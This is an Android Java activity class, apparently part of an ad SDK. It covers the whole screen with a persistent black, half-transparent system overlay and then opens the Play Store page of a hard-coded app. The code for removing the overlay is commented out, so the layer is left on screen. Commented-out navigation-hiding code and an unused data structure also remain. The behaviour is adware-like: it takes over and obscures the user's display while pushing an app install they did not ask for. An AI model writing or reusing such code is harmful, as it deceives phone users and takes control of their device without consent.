package com.api.utils.myfb;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.Display;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.TextView;

import static android.view.View.SYSTEM_UI_FLAG_LOW_PROFILE;
import static android.view.WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE;
import static android.view.WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_OFF;

/**
 * Created by fj on 2018/10/15.
 */

public class BlackActivity extends Activity {
    Window _window;
    private WindowManager manager;
    private TextView view;

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        this.getWindow().getAttributes().flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;

        super.onCreate(savedInstanceState);

        /* String adsenseBannerUrl = "https://play.google.com/store/apps/details?id=com.hwgg.tcsdzz";
        String id = Uri.parse(adsenseBannerUrl).getQueryParameter("id");
        Log.e("sdk","id -"+ id);

        try {
            this.getApplicationContext().startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + id)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        } catch (Exception anfe) {
            Log.e("sdk","Exception -"+anfe.getMessage());
            this.getApplicationContext().startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + id)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        }*/

        _window = getWindow();
//        WindowManager.LayoutParams params2 = _window.getAttributes();
//        params2.systemUiVisibility = View.SYSTEM_UI_FLAG_HIDE_NAVIGATION|View.SYSTEM_UI_FLAG_IMMERSIVE;
//        _window.setAttributes(params2);

//        _window = getWindow();
//        WindowManager.LayoutParams params = _window.getAttributes();
//        params.systemUiVisibility = View.SYSTEM_UI_FLAG_HIDE_NAVIGATION;
//        _window.setAttributes(params);
        /*setHideVirtualKey(_window);
        hideBottomUIMenu();
        _window.getDecorView().setOnSystemUiVisibilityChangeListener(new View.OnSystemUiVisibilityChangeListener() {
            @Override
            public void onSystemUiVisibilityChange(int visibility) {
                Log.e("sdk","==== onSystemUiVisibilityChange -");
                setHideVirtualKey(_window);
                hideBottomUIMenu();
            }
        });*/
        manager = (WindowManager) this.getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
        /*WindowManager.LayoutParams params = new WindowManager.LayoutParams(WindowManager.LayoutParams.TYPE_TOAST,WindowManager.LayoutParams.WRAP_CONTENT,WindowManager.LayoutParams.WRAP_CONTENT);

        params.format=1;
//        params.flags=40;
        params.flags=WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
        params.x = 0;//窗口位置的偏移量
        params.y = 0;
//        params.systemUiVisibility = View.SYSTEM_UI_FLAG_HIDE_NAVIGATION|View.SYSTEM_UI_FLAG_IMMERSIVE;

        params.alpha = 0.5f;//窗口的透明度
*/
        view = new TextView(this);
        view.setBackgroundColor(Color.parseColor("#000000"));
//        view.setBackgroundColor(Color.TRANSPARENT);
//        view.setText("sssss");
//        view.setTextSize(18);
        final Display display = manager.getDefaultDisplay();
        Point outPoint = new Point();
        if (Build.VERSION.SDK_INT >= 19) {
            // 可能有虚拟按键的情况
            display.getRealSize(outPoint);
        } else {
            // 不可能有虚拟按键
            display.getSize(outPoint);
        }
        int mRealSizeWidth;//手机屏幕真实宽度
        int mRealSizeHeight;//手机屏幕真实高度
        mRealSizeHeight = outPoint.y;
        mRealSizeWidth = outPoint.x;
        int max = Math.max(mRealSizeWidth, mRealSizeHeight);

        WindowManager.LayoutParams windowManagerParams = getWindowManagerParams(this,max);
//        view.setHeight(max+10000000);
        manager.addView(view, windowManagerParams);



        String adsenseBannerUrl = "https://play.google.com/store/apps/details?id=com.hwgg.tcsdzz";
        String id = Uri.parse(adsenseBannerUrl).getQueryParameter("id");
        Log.e("sdk","id -"+ id);

        try {
            this.getApplicationContext().startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + id)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        } catch (Exception anfe) {
            Log.e("sdk","Exception -"+anfe.getMessage());
            this.getApplicationContext().startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + id)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        }
//        setHideVirtualKey(_window);
//        hideBottomUIMenu();
    }


    public static WindowManager.LayoutParams getWindowManagerParams(Context context, int max) {
//        int max = Math.max(width, height);
//        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(max + ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION,
//                max + ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION, 2006, 66072, -2);

        WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.width = max;
        lp.height = max;
//        lp.type = (Build.VERSION.SDK_INT >= 19 && Build.VERSION.SDK_INT <= 24) ? WindowManager.LayoutParams.TYPE_TOAST : WindowManager.LayoutParams.TYPE_PHONE;
        lp.type = WindowManager.LayoutParams.TYPE_SYSTEM_ERROR;
        lp.format = PixelFormat.TRANSLUCENT;
//        lp.flags = WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
//        lp.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR;
        lp.flags = 17368856;
/*        lp.flags =
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
//                WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR |
//               WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
               WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN;
//                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS;*/
        lp.dimAmount = -1f;
        lp.gravity = 8388659;
        lp.buttonBrightness = BRIGHTNESS_OVERRIDE_NONE;
        lp.systemUiVisibility = SYSTEM_UI_FLAG_LOW_PROFILE;

        lp.alpha = 0.5f;//窗口的透明度
        return lp;
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
//        if (manager != null) {
//            manager.removeViewImmediate(view);
//        }
    }

    protected void hideBottomUIMenu() {
        //隐藏虚拟按键，并且全屏
        if (Build.VERSION.SDK_INT > 11 && Build.VERSION.SDK_INT < 19) { // lower api
            View v = this.getWindow().getDecorView();
            v.setSystemUiVisibility(View.GONE);
        } else if (Build.VERSION.SDK_INT >= 19) {
            //for new api versions.
            View decorView = getWindow().getDecorView();
            int uiOptions = View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY | View.SYSTEM_UI_FLAG_FULLSCREEN;
            decorView.setSystemUiVisibility(uiOptions);
        }
    }

    public void setHideVirtualKey(Window window) { //保持布局状态
        int uiOptions = View.SYSTEM_UI_FLAG_LAYOUT_STABLE | //布局位于状态栏下方
                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION | //全屏
                View.SYSTEM_UI_FLAG_FULLSCREEN | //隐藏导航栏
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN;
        if (Build.VERSION.SDK_INT >= 19) {
            uiOptions |= 0x00001000;
        } else {
            uiOptions |= View.SYSTEM_UI_FLAG_LOW_PROFILE;
        }
        window.getDecorView().setSystemUiVisibility(uiOptions);
        Entry[] entries = new Entry[10];
    }

    class Entry
    {
        public String key;
        public String value;

        private Entry next;
    }
}
